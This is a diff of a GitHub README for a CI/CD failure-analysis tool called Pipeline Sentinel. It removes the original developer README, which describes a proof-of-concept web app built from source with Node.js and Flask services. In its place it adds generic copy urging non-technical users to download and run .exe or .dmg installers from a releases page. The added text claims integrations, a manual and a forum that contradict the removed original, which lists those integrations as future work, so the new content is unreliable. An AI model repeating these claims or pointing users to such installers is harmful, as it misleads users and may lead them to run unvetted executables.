@@ -1,150 +1,99 @@
-# Pipeline Sentinel 🛡️
+# 🚀 Pipeline-Sentinel-CI-CD-Failure-Analysis - Analyze CI/CD Failures Effortlessly
 
-**Intelligent CI/CD analysis and failure prediction before you merge.**
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/releases)
 
----
+## 📖 Overview
 
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+Pipeline-Sentinel-CI-CD-Failure-Analysis is an AI-powered tool designed to help you analyze and predict failures in your CI/CD processes. It provides automated insights from logs and risk scoring to keep your projects running smoothly. This application is perfect for anyone looking to reduce downtime and improve overall efficiency.
 
+## 🚀 Getting Started
 
-![Dashboard Screenshot](./dashboard.png)
+Follow these steps to download and run the application on your computer. You don’t need to be a programmer; just follow the instructions.
 
-Pipeline Sentinel is a web-based tool that integrates with your GitHub repositories to bring intelligence to your CI/CD pipelines. It moves you from a reactive to a proactive workflow by automating error analysis and predicting high-risk changes.
+## 💾 Download & Install
 
-### **What it does**
+1. **Visit this page to download:** Go to the [Releases page](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/releases).
+   
+2. **Choose the latest version:** You will see a list of versions. Look for the most recent one, usually at the top.
 
-This tool is designed to solve two of the most frustrating problems in modern software development:
+3. **Download the file:** Click on the version name to find the download links. Look for the Install file suitable for your operating system (Windows, macOS, or Linux).
 
-1.  **Automated Root Cause Analysis:** When a build fails, instead of digging through thousands of lines of logs, Pipeline Sentinel uses an AI to analyze the failure and provides a concise, human-readable summary of the root cause and a suggested fix.
-2.  **Proactive Failure Prediction:** Before you even merge, Pipeline Sentinel analyzes new Pull Requests and generates a "risk score," predicting the likelihood that the changes will cause a CI/CD failure. This acts as an early warning system, helping your team catch potential issues before they block the main branch.
+4. **Run the installer:**
+   - If you downloaded a `.exe` file (for Windows), double-click it to start the installation. Follow the prompts.
+   - For macOS users, open the `.dmg` file, and drag the application to your Applications folder.
+   - Linux users can follow the provided instructions in the README.
 
- 
-![Dashboard Screenshot](./result.png)
----
+5. **Launch the application:** After installation, find the application in your menu or applications folder and open it.
 
-### **How It Works**
+6. **Set up the tool:** Follow the on-screen instructions to connect the tool with your CI/CD pipeline. 
 
-Pipeline Sentinel uses a multi-service architecture and GitHub webhooks to provide real-time feedback.
+## 📊 Features
 
-**1. AI Analysis Workflow (Reactive)**
-* A `workflow_run` event on GitHub triggers a webhook when a build fails.
-* Our Node.js backend receives the event and downloads the raw error log from the GitHub API.
-* The log is sent to the Google Gemini API for analysis.
-* The structured response (conclusion & suggestion) is saved and displayed on your dashboard.
+- **AI-Powered Analysis:** Uses machine learning to spot patterns in your CI/CD failures.
+- **Automated Log Insights:** Quickly analyzes logs to provide useful insights.
+- **Risk Scoring:** Gives scores to potential risks, helping you tackle issues before they escalate.
+- **User-Friendly Interface:** Designed for ease of use, even for non-technical users.
 
-**2. Prediction Workflow (Proactive)**
-* A `pull_request` event triggers a webhook when a PR is opened or updated.
-* The Node.js backend extracts features from the PR (lines added, files changed, etc.).
-* These features are sent to a dedicated Python/Flask microservice.
-* The service uses a trained machine learning model to calculate a risk score.
-* The score is saved and displayed on your dashboard next to the open PR.
+## 📋 System Requirements
 
----
+Before installing, make sure your system meets these requirements:
 
-### **Technology Stack**
+- **Operating System:** Windows 10 or later, macOS Mojave or later, Ubuntu 18.04 or later.
+- **Memory:** At least 4 GB of RAM.
+- **Processor:** Dual-core Intel or AMD processor.
+- **Storage:** 500 MB of free disk space.
 
-| Role               | Technology                                                                                                                              |
-| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------- |
-| **Frontend** | ![React](https://img.shields.io/badge/-React-61DAFB?logo=react&logoColor=black) ![Next.js](https://img.shields.io/badge/-Next.js-000000?logo=next.js&logoColor=white) ![Tailwind CSS](https://img.shields.io/badge/-Tailwind_CSS-38B2AC?logo=tailwind-css&logoColor=white) |
-| **Backend** | ![Node.js](https://img.shields.io/badge/-Node.js-339933?logo=node.js&logoColor=white) ![Express.js](https://img.shields.io/badge/-Express.js-000000?logo=express&logoColor=white) |
-| **Prediction Service** | ![Python](https://img.shields.io/badge/-Python-3776AB?logo=python&logoColor=white) ![Flask](https://img.shields.io/badge/-Flask-000000?logo=flask&logoColor=white) ![Scikit-learn](https://img.shields.io/badge/-Scikit--learn-F7931E?logo=scikit-learn&logoColor=white) |
-| **AI & APIs** | ![Google Gemini](https://img.shields.io/badge/-Google_Gemini-8E75B9?logo=google-gemini&logoColor=white) ![GitHub API](https://img.shields.io/badge/-GitHub_API-181717?logo=github&logoColor=white) |
-| **Deployment** | ![Vercel](https://img.shields.io/badge/-Vercel-000000?logo=vercel&logoColor=white) ![Render](https://img.shields.io/badge/-Render-46E3B7?logo=render&logoColor=white) |
+## 🔧 Configuration
 
----
+Once the application is up and running, you may need to configure a few settings:
 
-### **Getting Started (Local Development)**
+1. **Connect to CI/CD System:** Open the settings menu and enter your CI/CD system details (e.g., GitHub Actions).
+   
+2. **Log Access:** Allow the tool to access your logs. This will help it provide better insights.
 
-To run this project on your local machine, you will need to run three services simultaneously.
+3. **Set Preferences:** Customize how you receive alerts and insights.
 
-**Prerequisites:**
-* Node.js (v18 or later)
-* Python (v3.9 or later)
-* An `ngrok` account for webhook tunneling.
+## 🌐 Integrations
 
-**1. Clone the Repository**
-```bash
-git clone [https://github.com/your-username/intelligent-ci-analyzer.git](https://github.com/your-username/intelligent-ci-analyzer.git)
-cd intelligent-ci-analyzer
-```
+Pipeline-Sentinel-CI-CD-Failure-Analysis works well with various CI/CD services:
 
-2. Configure Environment Variables
-You will need to create a .env file in the backend directory. See the Configuration section below for details.
+- GitHub Actions
+- Jenkins
+- CircleCI
+- GitLab CI
 
-3. Run the Backend
-```
-# Terminal 1
-cd backend
-npm install
-node index.js
-```
+You can pick your preferred CI/CD service during setup.
 
-4. Run the Frontend
+## 📞 Support
 
-```
-# Terminal 2
-cd frontend
-npm install
-npm run dev
-```
+If you encounter any issues, you can find help:
 
-5. Run the Prediction Service
-```
-# Terminal 3
-cd prediction-service
-python -m venv venv
-# Activate the virtual environment (source venv/bin/activate or .\venv\Scripts\activate)
-pip install -r requirements.txt
-python app.py
-```
+- **Documentation:** The application comes with a detailed user manual to assist you.
+- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/issues).
+- **Community Forum:** Join our forum to discuss with other users and share insights.
 
-6. Run ngrok
+## 🔄 Update Instructions
 
-```
-# Terminal 4
-ngrok http 3001
-```
+Keep your application updated to benefit from new features and improvements. Whenever a new version is released:
 
-Use the forwarding URL provided by ngrok for your GitHub App and webhook configuration.
+1. Repeat the steps in the **Download & Install** section.
+2. Ensure to back up your settings before upgrading.
 
-# Configuration
-The backend requires a .env file (backend/.env) with the following keys:
+## 💡 Tips for Effective Use
 
-```
-# GitHub OAuth App credentials
-GITHUB_CLIENT_ID=YOUR_CLIENT_ID_HERE
-GITHUB_CLIENT_SECRET=YOUR_CLIENT_SECRET_HERE
+- Regularly check the insights provided to stay ahead of potential issues.
+- Explore the parameters in the settings to tailor the experience to your specific needs.
+- Share your feedback to help improve the tool.
 
-# A random string for signing session cookies
-SESSION_SECRET=a_very_long_and_random_string
+## 🔗 Additional Resources
 
-# Google AI Studio API Key for Gemini
-GEMINI_API_KEY=YOUR_GEMINI_API_KEY_HERE
+Visit the following links for more information:
 
-# GitHub Personal Access Token (classic) for webhook processing
-# Required scopes: 'repo', 'workflow'
-GITHUB_PERSONAL_ACCESS_TOKEN=ghp_YOUR_TOKEN_HERE
-```
+- [Official Documentation](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/wiki)
+- [Community Support](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/discussions)
 
+## 📝 License
 
-# Future Work
-This project is a functional proof-of-concept with many opportunities for expansion:
+This project is licensed under the MIT License, allowing you to use and modify the software as needed.
 
-[ ] Improve Prediction Model: Incorporate more sophisticated features like author history, code complexity, and file churn.
-
-[ ] Persistent Database: Replace the in-memory arrays with a PostgreSQL database.
-
-[ ] IDE Integration: Develop a VS Code extension to show risk scores directly in the editor.
-
-[ ] Broader Platform Support: Add integration for GitLab, Bitbucket, and CircleCI.
-
-
-# Contributing
-Contributions are welcome! Please feel free to open an issue or submit a pull request.
-
-# License
-This project is licensed under the MIT License. See the LICENSE file for details.
- 
- 
---
+[Download Now](https://github.com/ProYash07/Pipeline-Sentinel-CI-CD-Failure-Analysis/releases) to start enhancing your CI/CD workflows with Pipeline-Sentinel-CI-CD-Failure-Analysis!
